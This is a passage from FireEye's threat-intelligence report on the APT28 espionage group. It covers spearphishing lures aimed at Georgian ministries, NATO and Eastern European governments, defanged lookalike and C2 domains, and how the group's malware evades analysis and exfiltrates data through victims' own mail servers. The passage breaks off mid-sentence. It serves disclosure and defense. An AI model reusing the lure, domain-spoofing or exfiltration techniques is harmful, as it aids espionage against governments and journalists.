{
    "id": "76d27733-ed6f-4514-a1fb-758a7b365588",
    "created_at": "2022-10-25T16:48:16.78702Z",
    "updated_at": "2025-03-27T02:17:11.62629Z",
    "deleted_at": null,
    "sha1_hash": "89a6a1486886ca4667af9ae96d95b6a4f658e7bd",
    "title": "APT28: A Window into Russia’s Cyber Espionage Operations? | FireEye",
    "authors": "",
    "file_creation_date": "2014-10-27T18:28:50Z",
    "file_modification_date": "2014-10-27T18:29:32Z",
    "file_size": 11041291,
    "plain_text": "##### APT28:\n###### A WINDOW INTO RUSSIA’S CYBER ESPIONAGE OPERATIONS?\n\n### SECURITY\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### CONTENTS\n\nEXECUTIVE SUMMARY....................................................................................................................................................................................................................................................................................3\n\nAPT28 TARGETING REFLECTS RUSSIAN INTERESTS.........................................................................................................................................................................6\n\nAPT28 interest in the Caucasus, Particularly Georgia............................................................................................................................................................7\n\nAPT28 Targeting of the Georgian Ministry of Internal Affairs (MIA)........................................................................................8\n\nAPT28 Targeting of the Georgian Ministry of Defense........................................................................................................................................9\n\nAPT28 Targeting a Journalist Covering the Caucasus....................................................................................................................................... 10\n\nAPT28’s Other Targets in the Caucasus........................................................................................................................................................................................ 11\n\nAPT28 Targeting of Eastern European Governments and Militaries.................................................................................................... 12\n\nAPT28 Targeting of NATO and Other European Security Organizations..................................................................................... 14\n\nAPT28 Targets European Defense Exhibitions................................................................................................................................................................ 16\n\nOther APT28 Targets Are Consistent With Nation State Interests......................................................................................................... 17\n\nAPT28 MALWARE INDICATES SKILLED RUSSIAN DEVELOPERS......................................................................................................................... 19\n\nModular Implants Indicate a Formal Development Environment............................................................................................................... 24\n\nAPT28 Malware Indicates Russian Speakers in a Russian Time Zone................................................................................................. 25\n\nCompile Times Align with Working Hours in Moscow and St. Petersburg................................................................ 27\n\nCONCLUSION.................................................................................................................................................................................................................................................................................................................. 28\n\nAPPENDIX A: DISTINGUISHING THREAT GROUPS.......................................................................................................................................................................... 29\n\nAPPENDIX B: TIMELINE OF APT28 LURES.......................................................................................................................................................................................................... 30\n\nAPPENDIX C: SOURFACE/CORESHELL...................................................................................................................................................................................................................... 31\n\nAPPENDIX D: CHOPSTICK.................................................................................................................................................................................................................................................................... 35\n\nAPPENDIX E: OLDBAIT................................................................................................................................................................................................................................................................................. 43\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### EXECUTIVE SUMMARY\n\n Our clients often ask us to assess the threat Russia poses in cyberspace. Russia has long been a whispered frontrunner among capable nations for performing sophisticated network operations. This perception is due in part to the Russian government’s alleged involvement in the cyber attacks accompanying its invasion of Georgia in 2008, as well as the rampant speculation that Moscow was behind a major U.S. Department of Defense network compromise, also in 2008. These rumored activities, combined with a dearth of hard evidence, have made Russia into something of a phantom in cyberspace.\n\n\nIn this paper we discuss a threat group whose\nmalware is already fairly well-known in the\ncybersecurity community. This group, unlike the\nChina-based threat actors we track, does not\nappear to conduct widespread intellectual\nproperty theft for economic gain. Nor have we\nobserved the group steal and profit from\nfinancial account information.\n\nThe activity that we profile in this paper\nappears to be the work of a skilled team of\ndevelopers and operators collecting intelligence\non defense and geopolitical issues – intelligence\nthat would only be useful to a government. We\nbelieve that this is an advanced persistent\nthreat (APT) group engaged in espionage\nagainst political and military targets including\n\n\nthe country of Georgia, Eastern European\ngovernments and militaries, and European\nsecurity organizations since at least 2007.\nThey compile malware samples with Russian\nlanguage settings during working hours\nconsistent with the time zone of Russia’s major\ncities, including Moscow and St. Petersburg.\n\nWhile we don’t have pictures of a building,\npersonas to reveal, or a government agency to\nname, what we do have is evidence of longstanding, focused operations that indicate a\ngovernment sponsor – specifically, a\ngovernment based in Moscow.\n\nWe are tracking this group as APT28.\n\n\n1 Markoff, John. “Before the Gunfire, Cyberattacks”. The New York Times 12 August 2008. Web. http://www.nytimes.com/2008/08/13/technology/13cyber.html\n\n2 Knowlton, Brian. “Military Computer Attack Confirmed”. The New York Times. 25 August 2010. Web. http://www.nytimes.com/2010/08/26/\n\ntechnology/26cyber.html\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### KEY FINDINGS\n\n\n###### APT28 targets insider information related to governments, militaries, and security organizations that would likely benefit the Russian government.\n\n|GEORGIA APT28 likely seeks to collect intelligence about Georgia’s security and political dynamics by targeting officials working for the Ministry of Internal Affairs and the Ministry of Defense.|EASTERN EUROPE APT28 has demonstrated interest in Eastern European governments and security organizations. These victims would provide the Russian government with an ability to predict policymaker intentions and gauge its ability to influence public opinion.|SECURITY ORGANIZATIONS APT28 appeared to target individuals affiliated with European security organizations and global multilateral institutions. The Russian government has long cited European security organizations like NATO and the OSCE as existential threats, particularly during periods of increased tension in Europe.|\n|---|---|---|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### KEY FINDINGS\n\n - Malware compile times suggest that APT28 developers\nhave consistently updated their tools over the last\nseven years.\n\n - APT28 malware, in particular the family of modular\nbackdoors that we call CHOPSTICK, indicates\na formal code development environment. Such an\nenvironment would almost certainly be required to\ntrack and define the various modules that can be\nincluded in the backdoor at compile time.\n\n\n###### Malware compile times suggest\n that APT28 developers have consistently updated their tools over the last seven years.\n\n Since 2007, APT28 has systematically evolved its malware, using flexible and lasting platforms indicative of plans for long-term use. The coding practices evident in the group’s malware suggest both a high level of skill and an interest in complicating reverse engineering efforts.\n\n- APT28 tailors implants for specific victim\nenvironments. They steal data by configuring their\nimplants to send data out of the network using a victim\nnetwork’s mail server.\n\n- Several of APT28’s malware samples contain counteranalysis capabilities including runtime checks to\nidentify an analysis environment, obfuscated strings\nunpacked at runtime, and the inclusion of unused\nmachine instructions to slow analysis.\n\n|Col1|Since 2007, APT28 has systematically evolved its malware, using flexible and lasting platforms indicative of plans for long-term use. The coding practices evident in the group’s malware suggest both a high level of skill and an interest in complicating reverse engineering efforts.|\n|---|---|\n\n\n###### Indicators in APT28’s malware suggest that the group consists of\n Russian speakers operating during business hours in Russia’s major cities.\n\n|More than half of the malware samples with Portable Executable (PE) resources that we have attributed to APT28 included Russian language settings (as opposed to neutral or English settings), suggesting that a significant portion of APT28 malware was compiled in a Russian language build environment consistently over the course of six years (2007 to 2013).|Over 96% of the malware samples we have attributed to APT28 were compiled between Monday and Friday. More than 89% were compiled between 8AM and 6PM in the UTC+4 time zone, which parallels the working hours in Moscow and St. Petersburg. These samples had compile dates ranging from mid-2007 to September 2014.|\n|---|---|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### Three themes in APT28’s targeting clearly reflect areas of specific interest to an Eastern European government, most likely the Russian government.\n\n APT28 TARGETING REFLECTS\n\n# RUSSIAN INTERESTS\n\n\nany of APT28’s targets align generally\nwith interests that are typical of any\ngovernment. However, three themes in\n\n#### M\n\nAPT28’s targeting clearly reflects areas of specific\ninterest to an Eastern European government, most\nlikely the Russian government. These include the\nCaucasus (especially the Georgian government),\nEastern European governments and militaries, and\nspecific security organizations.\n\nAPT28 uses spearphishing emails to target its\nvictims, a common tactic in which the threat group\ncrafts its emails to mention specific topics (lures)\nrelevant to recipients. This increases the\nlikelihood that recipients will believe that the\nemail is legitimate and will be interested in\nopening the message, opening any attached files,\nor clicking on a link in the body of the email. Since\nspearphishing lures are tailored to the recipients\n\n\nwhose accounts APT28 hopes to breach, the\nsubjects of the lures provide clues as to APT28’s\ntargets and interests. For example, if the group’s\nlures repeatedly refer to the Caucasus, then this\nmost likely indicates that APT28 is trying to gain\naccess to the accounts of individuals whose work\npertains to the Caucasus. Similarly, APT28’s practice\nof registering domains that mimic those of legitimate\nnews, politics, or other websites indicates topics that\nare relevant to APT28’s targets.\n\nWe identified three themes in APT28’s lures and\nregistered domains, which together are\nparticularly relevant to the Russian government.\n\nIn addition to these themes, we have seen APT28\ntarget a range of political and military\norganizations. We assess that the work of these\norganizations serves nation state governments.\n\n\n**APT 28: Three Themes**\n\nThe Caucasus,\nparticularly the\ncountry of Georgia\n\nEastern European\ngovernments and\nmilitaries\n\nThe North Atlantic\nTreaty Organization\n(NATO) and other\nEuropean security\norganizations\n\n\n7 Bloomberg. “Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.” February 2014.\n\n8 Ibid.\n\n9 Ibid.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APT28 INTEREST IN THE CAUCASUS,\n PARTICULARLY GEORGIA\n\n RUSSIA\n\nAbkhazia\n\n###### GEORGIA\n\n TURKEY\n\nhe Caucasus, a region that includes\nChechnya and other Russian republics and\nthe independent states of Georgia,\n\n#### T\n\nArmenia, and Azerbaijan, continues to experience\npolitical unrest. The Georgian government’s\nposture and ties to the West are a frequent\nsource of Moscow’s frustration, particularly after\nthe 2008 war. Overall, issues in the Caucasus\nlikely serve as focal points for Russian\nintelligence collection efforts.\n\n\nSince 2011, APT28 has used lures written in\nGeorgian that are probably intended to target\nGeorgian government agencies or citizens.\nAPT28 is likely seeking information on Georgia’s\nsecurity and diplomatic postures. Specifically,\nthe group has targeted the Georgian Ministry of\nInternal Affairs (MIA) and the Ministry of\nDefense (MOD). We also observed efforts to\ntarget a journalist working on issues in the\nCaucasus and a controversial Chechen news site.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n**Georgian Ministry of Internal Affairs (MIA)**\n\n\n###### APT28 made at least two specific attempts to target the Georgian Ministry of Internal Affairs.\n\n\n###### APT28 Targeting of the Georgian Ministry of Internal Affairs (MIA)\nThe MIA harbors sensitive information about the\ninner workings of Georgia’s security operations, the\ncountry’s engagement in multilateral institutions,\nand the government’s communications backbone. It\nis responsible for[3]:\n\n- Policing, internal security, and border patrols\n\n- Counterintelligence\n\n- Counterterrorism\n\n- International relations\n\n- Defense of Georgia’s strategic facilities\nand assets\n\n- “Operative-Technical” tasks\n\nAPT28 made at least two specific attempts to\ntarget the MIA. In one case, we identified an\nAPT28 lure from mid-2013 that referenced\nMIA-related topics and employed malware that\nattempted to disguise its activity as legitimate\nMIA email traffic. The lure consisted of a\nweaponized Excel file that presented a decoy\ndocument containing a list of Georgian driver’s\n\n3 Georgian Ministry of Internal Affairs website http://police.ge/en/home\n\n\nlicense numbers. The backdoor attempted to\nestablish a connection to a Georgian MIA mail\nserver and communicate via MIA email addresses\nending with “@mia.ge.gov”. Once connected to the\nmail server, APT28’s backdoor sent an email\nmessage using a subject line related to driver’s\nlicenses (in Georgian), and attached a file\ncontaining system reconnaissance information.\nThis tactic could allow APT28 to obtain data from\nthe MIA’s network through a less-monitored\nroute, limiting the MIA network security\ndepartment’s abilities to detect the traffic.\n\nIn the second example of MIA targeting, an APT28\nlure used an information technology-themed decoy\ndocument that included references to the Windows\ndomain “MIA Users\\Ortachala…” (Figure 1).\nThis probably referred to the MIA facility in the\nOrtachala district of Tbilisi, Georgia’s capital city.\nThe decoy document also contains metadata listing\n“MIA” as the company name and “Beka Nozadze”[4]\nas an author, a possible reference to a system\nadministrator in Tbilisi. The text of the document\npurports to provide domain and user group setup\n\n\n4 Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\ninformation for internal Windows XP and Windows\n7 systems. APT28 possibly crafted this document\nto appear legitimate to all MIA system users and\nintended to breach the MIA network specifically\nusing the embedded malware.\n\n###### APT28 Targeting of the Georgian Ministry of Defense\nAPT28 also appeared to target Georgia’s MOD\nalong with a U.S. defense contractor that was\n\n\ntraining the Georgian military. APT28 used a lure\ndocument that installed a SOURFACE downloader\n(further discussed in the Malware section) and\ncontained a listing of birthdays for members of a\nworking group between the Georgian MOD and\nthe U.S. defense contractor. The U.S. contractor\nwas involved in a working group to advise the MOD\nand Georgian Armed Forces, assess Georgia’s\nmilitary capabilities, and develop a military training\nprogram for the country.\n\n\n**Figure 1: Georgian MIA-related decoy**\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n**Figure 2: Excerpt of APT28’s letter to a journalist writing on Caucasus-related issues**\n\nWe wish our cooperation will be both profitable and trusted. Our aim in the Caucasian region is\nto help people who struggle for their independence, liberty and human rights. We all know, that\nworld is often unfair and cruel, but all together we can make it better.\n\nSend your articles on this email – in Russian or English, please. There are some difficulties with\nCaucasian languages, but we’ll solve the problem pretty soon, I hope.\n\n###### Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting.\n\n\nWe believe that APT28’s targeting of the MOD\naligns with Russian threat perceptions. The\ngrowing U.S.-Georgian military relationship has\nbeen a source of angst for Russia. Georgia and\nRussia severed diplomatic relations following the\nRussia-Georgia War in 2008, and Georgia has\nsince sought to align itself more closely with\nwestern security organizations. Additionally, in\nJune 2014, despite Russia’s vocal objections,\nGeorgia, along with Ukraine and Moldova, signed\nassociation accords with the EU.[5] This move\nplaced all three countries more firmly in the EU’s\npolitical, economic, and security spheres of\ninfluence. Georgian military security issues,\nparticularly with regard to U.S. cooperation and\nNATO, provide a strong incentive for Russian\nstate-sponsored threat actors to steal information\nthat sheds light on these topics.\n\n\n###### APT28 Targeting a Journalist Covering the Caucasus\nAnother one of APT28’s lures appeared to target\na specific journalist covering issues in the\nCaucasus region. In late 2013, APT28 used a lure\nthat contained a letter addressing a journalist by\nhis first name and claiming to originate from a\n“Chief Coordinator” in Reason Magazine’s\n“Caucasian Issues Department” - a division that\ndoes not appear to exist.[6] (Reason Magazine is a\nUS-based magazine) The letter welcomed the\nindividual as a contributor and requested topic\nideas and identification information in order to\nestablish him at the magazine. In the background,\nthe decoy document installed a SOURFACE\nbackdoor on the victim’s system.\n\n\n5 “The EU’s Association Agreements with Georgia, the Republic of Moldova and Ukraine”. European Union Press Release Database. 23 June 2014.\n\nWeb. http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm\n\n6 We attempted to identify candidate journalists in the country. One of these was a Georgian national of Chechen descent, whose work appears to center on\n\nChechen and human rights issues. Ultimately, however, we cannot confirm the identity of the target(s).\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n**Table 1: Examples of APT28 domains imitating organizations in the Caucasus**\n\n**APT28 Domain** **Real Domain**\n\nThe Kavkaz Center / The Caucasus Center, an international Islamic news agency with coverage of\nkavkazcentr[.]info\nIslamic issues, particularly Russia and Chechnya\n\nrnil[.]am Armenian military (mil.am)\n\nThe body of the letter suggests that APT28 actors\nare able to read at least two languages – Russian\nand English. The grammar of the letter also\nindicates that English is not the author’s first\nlanguage, despite it purportedly originating from a\nUS-based magazine. This implies that Russian may\nbe the APT28 author’s preferred language.\n\nTargeting journalists could provide APT28 and its\nsponsors with a way to monitor public opinion,\nidentify dissidents, spread disinformation, or\nfacilitate further targeting. Several other nation\nstates are suspected of targeting journalists and\ndissidents to monitor their activity, including China\nand Iran.[7,8] Journalists in the Caucasus working on\nCaucasus independence issues would be a prime\ntarget for intelligence collection for Moscow.\nJournalists critical of the Kremlin have long\nbeen targets of surveillance and harassment,\nand a number of governments and human\nrights organizations have publicly criticized the\ngovernment for its treatment of journalists and its\nincreasing consolidation of control over the media.[9]\n\n|APT28 Domain|Real Domain|\n|---|---|\n|kavkazcentr[.]info|The Kavkaz Center / The Caucasus Center, an international Islamic news agency with coverage of Islamic issues, particularly Russia and Chechnya (kavkazcenter.com)|\n|rnil[.]am|Armenian military (mil.am)|\n\n\n###### APT28’s Other Targets in the Caucasus\nWe have seen APT28 register at least two\ndomains mimicking the domains of legitimate\norganizations in the Caucasus, as shown in the\ntable below. One APT28 domain imitated a key\nChechen-focused news website, while the other\nappeared to target members of the Armenian\nmilitary by hosting a fake login page.\n\nOf particular note, the Kavkaz Center is a\nChechen-run website designed to present an\nalternative view to the long-running conflict\nbetween Russia and Chechen separatists. In\n2004[10] and 2013,[11] Russia’s Foreign Minister\nvoiced his displeasure that a Swedish company\ncontinues to host the Kavkaz Center website.\n\n\n7 Moran, Ned, Villeneuve, Nart, Haq, Thofique, and Scott, Mike. “Operation Saffron Rose”. FireEye. 13 May 2014. Web. http://www.fireeye.com/blog/technical/\n\nmalware-research/2014/05/operation-saffron-rose.html\n\n8 The New York Times publicly disclosed their breach by APT12, which they assess was motivated by the China-based actors’ need to know what the\n\nnewspaper was publishing about a controversial topic related to corruption and the Chinese Communist Party’s leadership.\n\n9 “Russia”. Freedom House Press Release. 2013. Web. http://www.freedomhouse.org/report/freedom-press/2013/russia#.VD8fe9R4rew\n\n10“Chechen website promotes terror: Lavrov”. UPI. 16 November 2014. Web. http://www.upi.com/Top_News/2004/11/16/Chechen-website-promotes\nterror-Lavrov/UPI-11601100627922/\n\n11“Lavrov urges Sweden to ban Chechen website server” The Voice of Russia. 15 May 2013. Web. http://voiceofrussia.com/news/2013_05_15/Lavrov-urges\nSweden-to-ban-Chechen-website-server/\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APT28 TARGETING OF EASTERN EUROPEAN GOVERNMENTS AND MILITARIES\n\n\nastern European countries’ political and\nmilitary postures are traditionally core Russian\ngovernment interests. The Kremlin has long\n\n#### E\n\nregarded the former Soviet Republics and satellite\nstates as in its sphere of economic, political, and\nmilitary interest. Over the past two decades, as many\nof these states joined NATO and the EU, Russia has\nattempted to regain its influence in the region. Many\nof APT28’s targets parallel this continued focus on\nEastern European governments and militaries.\n\n###### APT28 Targets Eastern European Government Organizations\nWe have evidence that APT28 made at least two\nattempts to compromise Eastern European\ngovernment organizations:\n\n                              - In a late 2013 incident, a FireEye device\ndeployed at an Eastern European Ministry of\nForeign Affairs detected APT28 malware in\nthe client’s network.\n\n                              - More recently, in August 2014 APT28 used a\nlure (Figure 3) about hostilities surrounding a\nMalaysia Airlines flight downed in Ukraine in\na probable attempt to compromise the Polish\ngovernment. A SOURFACE sample employed\nin the same Malaysia Airlines lure was\nreferenced by a Polish computer security\ncompany in a blog post.[12] The Polish security\ncompany indicated that the sample was “sent\nto the government,” presumably the Polish\ngovernment, given the company’s location\nand visibility.\n\n12 “MHT, MS12-27 Oraz *malware*.info” Malware@Prevenity. 11 August 2014. Web. http://malware.prevenity.com/2014/08/malware-info.html\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n**Table 2: Examples of APT28 domains imitating legitimate Eastern European organization names**\n\n**APT28 Domain** **Real Domain**\n\nstandartnevvs[.]com Bulgarian Standart News website (standartnews.com)\n\nnovinitie[.]com, n0vinite[.]com Bulgarian Sofia News Agency website (novinite.com)\n\nqov[.]hu[.]com Hungarian government domain (gov.hu)\n\nq0v[.]pl, mail[.]q0v[.]pl Polish government domain (gov.pl) and mail server domain (mail.gov.pl)\n\npoczta.mon[.]q0v[.]pl Polish Ministry of Defense mail server domain (poczta.mon.gov.pl)\n\n###### We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations.\n\n|APT28 Domain|Real Domain|\n|---|---|\n|standartnevvs[.]com|Bulgarian Standart News website (standartnews.com)|\n|novinitie[.]com, n0vinite[.]com|Bulgarian Sofia News Agency website (novinite.com)|\n|qov[.]hu[.]com|Hungarian government domain (gov.hu)|\n|q0v[.]pl, mail[.]q0v[.]pl|Polish government domain (gov.pl) and mail server domain (mail.gov.pl)|\n|poczta.mon[.]q0v[.]pl|Polish Ministry of Defense mail server domain (poczta.mon.gov.pl)|\n\n\nAPT28 has registered domains similar to those of\nlegitimate Eastern European news sites and\ngovernments, listed in Table 2. These domain\nregistrations not only suggest that APT28 is\ninterested in Eastern European political affairs,\nbut also that the group targets Eastern European\ngovernments directly.\n\nIn addition, APT28 used one domain for command\nand control sessions (baltichost[.]org) that was\nthemed after the Baltic Host exercises. Baltic Host\nis a multinational logistics planning exercise, hosted\nannually since 2009 by one of the three Baltic\nStates (Estonia, Latvia, and Lithuania, all three of\nwhich are on Russia’s border) on a rotational basis.\nIn June 2014, this event was integrated with a\nlarger U.S. Army training event, and focused on\nexercises to improve interoperability with regional\nallies and partners.[13, 14 ]\n\n\nThis domain registration suggests that APT28\nsought to target individuals either participating in\nthe exercises or interested in Baltic military and\nsecurity matters. Such targets would potentially\nprovide APT28 with sensitive tactical and\nstrategic intelligence concerning regional military\ncapabilities and relationships. These exercises are\na particular point of interest in Moscow: proKremlin press cited Russia’s interpretation of\nthese military exercises and NATO’s involvement\nas a “sign of aggression,” and Russia’s Foreign\nMinister publicly stated that the exercise was “a\ndemonstration of hostile intention.”[15]\n\n\n13 “Saber Strike and Baltic Host kick off in Latvia, Lithuania and Estonia’. Estonian Defense Forces. 9 June 2014. Web. 11 June 2014. http://www.mil.ee/en/\nnews/8251/saber-strike-and-baltic-host-kick-off-in-latvia,-lithuania-and-estonia\n\n14 “Baltic Host 2014 rendering host nation support for the training audience of Exercise Saber Strike 2014 and repelling faked cyber-attacks”. Republic of\n\nLithuania Ministry of National Defense. 12 June 2014. Web. http://www.kam.lt/en/news_1098/current_issues/baltic_host_2014_rendering_host_nation_\nsupport_for_the_training_audience_of_exercise_saber_strike_2014_and_repelling_faked_cyber-attacks.html\n\n15 “Tanks, troops, jets: NATO countries launch full-scale war games in Baltic”. Russia Today. 9 June 2014. Web. http://rt.com/news/164772-saber-strike\nexercise-nato/\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APT28 TARGETING OF NATO AND OTHER EUROPEAN SECURITY ORGANIZATIONS\n\nPT28’s lures and domain registrations also\ndemonstrate their interest in NATO and\nother European security organizations.\n\n#### A\n\nNATO remains a chief Russian adversary, or in the\nwords of Russia’s 2010 military doctrine, a “main\nexternal military danger” particularly as it moves\n“closer to the borders of the Russian Federation.”[16]\nAs the traditional western counterweight to the\nSoviet Union, Russia regards NATO, particularly\nNATO’s eastward expansion, as a threat to Russia’s\nstrategic stability. APT28 also registered a domain\nname imitating the Organization for Security\nand Cooperation in Europe (OSCE), an\nintergovernmental organization that has cited\nwidespread fraud in numerous Russian state\n\n\nelections. Insider information about NATO, the\nOSCE and other security organizations would\ninform Russian political and military policy.\n\nSeveral of the domains APT28 registered imitated\nNATO domain names, including those of NATO\nSpecial Operations Headquarters and the NATO\nFuture Forces Exhibition. We also observed a user\nthat we suspect works for NATO HQ submit an\nAPT28 sample to VirusTotal, probably as a result\nof receiving a suspicious email.\n\n\n**Table 3: Examples of APT28 domains imitating legitimate NATO and security websites**\n\n**APT28 Domain** **Real Domain**\n\nnato.nshq[.]in NATO Special Operations Headquarters (nshq.nato.int)\n\nnatoexhibitionff14[.]com NATO Future Forces 2014 Exhibition & Conference\n\nlogin-osce[.]org Organization for Security and Cooperation in Europe\n\n16 The Military Doctrine of the Russian Federation, approved by Presidential edict on 5 February 2010.\n\n|APT28 Domain|Real Domain|\n|---|---|\n|nato.nshq[.]in|NATO Special Operations Headquarters (nshq.nato.int)|\n|natoexhibitionff14[.]com|NATO Future Forces 2014 Exhibition & Conference (natoexhibition.org)|\n|login-osce[.]org|Organization for Security and Cooperation in Europe (osce.org)|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n\nAPT28 also demonstrated an interest in defense\nattaches working in European countries. We identified\nan APT28 lure containing a decoy document with a list\nof British officers and U.S. and Canadian military\nattachés in London.\n\nFinally, APT28 used a lure that contained an apparent\nnon-public listing of contact information for defense\nattachés in the “Ankara Military Attaché Corps (AMAC),”\nwhich appears to be a professional organization of\ndefense attachés in Turkey.\n\n\n**Figure 5: Ankara**\nMilitary Attache Corps\ndecoy document\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APT28 Targets European\n Defense Exhibitions\nIn addition to targeting European security\norganizations and governments, it appears that\nAPT28 is targeting attendees of European\ndefense exhibitions. Some of the APT28registered domains imitated those of defense\nevents held in Europe, such as the Farnborough\nAirshow 2014, EuroNaval 2014, EUROSATORY\n2014, and the Counter Terror Expo. In September\n2014, APT28 registered a domain (smigrouponline.co[.]uk) that appeared to mimic that for the\n\n\nSMi Group, a company that plans events for the\n“Defence, Security, Energy, Utilities, Finance and\nPharmaceutical sectors.” Among other events, the\nSMi Group is currently planning a military satellite\ncommunications event for November 2014.\n\nTargeting organizations and professionals\ninvolved in these defense events would likely\nprovide APT28 with an opportunity to procure\nintelligence pertaining to new defense\ntechnologies, as well as the victim organizations’\noperations, communications, and future plans.\n\n\n###### Targeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### OTHER APT28 TARGETS ARE CONSISTENT WITH NATION STATE INTERESTS\n\nPT28 has targeted a variety of organizations\nthat fall outside of the three themes we\nhighlighted above. However, we are not\n\n#### A\n\nprofiling all of APT28’s targets with the same\ndetail because they are not particularly indicative\nof a specific sponsor’s interests. They do indicate\nparallel areas of interest to many governments\nand do not run counter to Russian state interests.\n\nAPEC\n\nOther probable APT28 targets that we have\nidentified: NATO\n\n- Norwegian Army (Forsvaret)\n\nOSCE\n\n- Government of Mexico\n\n- Chilean Military\n\n- Pakistani Navy\n\n- U.S. Defense Contractors\n\n- European Embassy in Iraq\n\n- Special Operations Forces Exhibition (SOFEX)\n\n**OTHER**\n\nin Jordan\n\n- Defense Attaches in East Asia\n\n- Asia-Pacific Economic Cooperation (APEC)\n\n- Al-Wayi News Site\n\n|INTERNATIONAL ORGANIZATION|Col2|Col3|Col4|\n|---|---|---|---|\n|European Commission||||\n|UN Office for the Coordination of Humanitarian Affairs||||\n|APEC||||\n|NATO||||\n|OSCE||||\n|World Bank||||\n|||||\n\n|OTHER|Col2|Col3|\n|---|---|---|\n|Hizb ut-Tahir|||\n|Chechnya Global|||\n|Diplomatic Forum|||\n|Military Trade Shows|||\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nUS DEFENSE ATTACHES AND US DEFENSE CONTRACTORS\n\n**KEY**\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### Our analysis of some of the group’s more commonly used tools indicates that APT28 has been systematically updating their malware since 2007.\n\n APT28 MALWARE INDICATES\n## SKILLED RUSSIAN DEVELOPERS\n\n\nPT28’s tools are suggestive of the group’s\nskills, ambitions, and identity. Our analysis\nof some of the group’s more commonly\n\n#### A\n\nused tools indicates that APT28 has been\nsystematically updating their tools since 2007.\nAPT28 is most likely supported by a group of\ndevelopers creating tools intended for long-term\nuse and versatility, who make an effort to\nobfuscate their activity. This suggests that APT28\nreceives direct ongoing financial and other\nresources from a well-established organization,\nmost likely a nation state government. APT28’s\nmalware settings suggest that the developers\nhave done the majority of their work in a Russian\nlanguage build environment during Russian\nbusiness hours, which suggests that the Russian\ngovernment is APT28’s sponsor.\n\nSome of APT28’s more commonly used tools are\nthe SOURFACE downloader, its second stage\nbackdoor EVILTOSS, and a modular family of\nimplants that we call CHOPSTICK.\n\n\n\n- **SOURFACE: This downloader is typically**\ncalled Sofacy within the cyber security\ncommunity. However because we have\nobserved the name “Sofacy” used to refer to\nAPT28 malware generally (to include the\nSOURFACE dropper, EVILTOSS,\nCHOPSTICK, and the credential harvester\nOLDBAIT), we are using the name\nSOURFACE to precisely refer to a specific\ndownloader. This downloader obtains a\nsecond-stage backdoor from a C2 server.\nCORESHELL is an updated version of\nSOURFACE.\n\n- **EVILTOSS: This backdoor has been delivered**\nthrough the SOURFACE downloader to gain\nsystem access for reconnaissance,\nmonitoring, credential theft, and shellcode\nexecution.\n\n- **CHOPSTICK: This is a modular implant**\ncompiled from a software framework that\nprovides tailored functionality and flexibility.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nA number of the malware variants that we profile\nbelow, especially the CHOPSTICK family,\ndemonstrate formal coding practices indicative of\nmethodical, diligent programmers. The modularity\nof CHOPSTICK alone, with its flexible and lasting\nplatform, demonstrates planning for long-term\nuse and versatility. We have also noted that\nAPT28 tailors implants to their target\nenvironments, configuring them to use local\nnetwork resources such as email servers.\n\nAPT28 has attempted to obfuscate their code and\nimplement counter-analysis techniques:\n\n\n\n- One of the latest samples of CORESHELL\nincludes counter-reverse engineering tactics\nvia unused machine instructions. This would\nhinder static analysis of CORESHELL behavior\nby creating a large amount of unnecessary\nnoise in the disassembly.\n\n- A number of CORESHELL droppers also\nconduct runtime checks, attempting to\ndetermine if they are executing in an analysis\nenvironment, and if so, they do not trigger\ntheir payloads.\n\n- Many samples across the SOURFACE/\nCORESHELL, CHOPSTICK, and EVILTOSS\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nmalware families obfuscate strings that are\ndecoded at runtime. Two of the malware\nfamilies (SOURFACE/CORESHELL and\nEVILTOSS) use the same decryption\nsequence and similar algorithms for string\nencoding and decoding. These families\nencode their strings at compile time using a\ncustom stream cipher. From a high level,\nthese ciphers share a similar design across\nthe malware families but differ slightly in the\ninternal arithmetic operations.\n\n               - APT28 has employed RSA encryption to\nprotect files and stolen information moved\nfrom the victim’s network to the controller.\n\n\nAPT28 has made incremental and systematic\nchanges to the SOURFACE downloader and its\nsurrounding ecosystem since as early as 2007.\nThese changes indicate a long-standing and\ndedicated development effort behind APT28. We\nhave observed samples of the SOURFACE\ndownloader compiled between 2007 and 2014.\nWe call SOURFACE (samples are frequently\nnamed netids.dll) a first stage downloader\nbecause its primary job is to retrieve a second\nstage payload from a C2 server. Until 2013, the\nSOURFACE downloader used hard-coded IP\naddresses for C2 communications, whereas the\nfuture CORESHELL samples use domains.\n\n\n###### EVOLUTION OF\n SOURFACE ECOSYSTEM INDICATES SYSTEMATIC DEVELOPMENT\n\n WHAT IS A MALWARE 